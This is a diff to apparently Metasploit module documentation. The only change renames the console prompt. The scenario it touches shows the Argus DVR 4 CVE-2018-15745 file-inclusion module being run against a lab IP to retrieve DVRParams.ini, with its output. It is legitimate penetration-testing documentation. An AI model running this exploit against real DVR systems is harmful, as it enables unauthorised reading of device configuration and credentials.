@@ -22,12 +22,12 @@ To setup a test environment, the following steps can be performed:
 ## Scenarios
 ### Utilising Argus DVR 4 CVE-2018-15745 to Leak DVRParams.ini
 ```
-msf6 > use auxiliary/gather/argus_dvr_4_lfi_cve_2018_15745 
-msf6 auxiliary(gather/argus_dvr_4_lfi_cve_2018_15745) > set RHOSTS 192.168.1.15
+msf > use auxiliary/gather/argus_dvr_4_lfi_cve_2018_15745 
+msf auxiliary(gather/argus_dvr_4_lfi_cve_2018_15745) > set RHOSTS 192.168.1.15
 RHOSTS => 192.168.1.15
-msf6 auxiliary(gather/argus_dvr_4_lfi_cve_2018_15745) > set TARGET_FILE ProgramData/PY_Software/Argus Surveillance DVR/DVRParams.ini
+msf auxiliary(gather/argus_dvr_4_lfi_cve_2018_15745) > set TARGET_FILE ProgramData/PY_Software/Argus Surveillance DVR/DVRParams.ini
 TARGET_FILE => ProgramData/PY_Software/Argus Surveillance DVR/DVRParams.ini
-msf6 auxiliary(gather/argus_dvr_4_lfi_cve_2018_15745) > run
+msf auxiliary(gather/argus_dvr_4_lfi_cve_2018_15745) > run
 [*] Running module against 192.168.1.15
 [*] Sending request to 192.168.1.15:8080 for file: ProgramData/PY_Software/Argus%20Surveillance%20DVR/DVRParams.ini
 [+] File retrieved successfully!
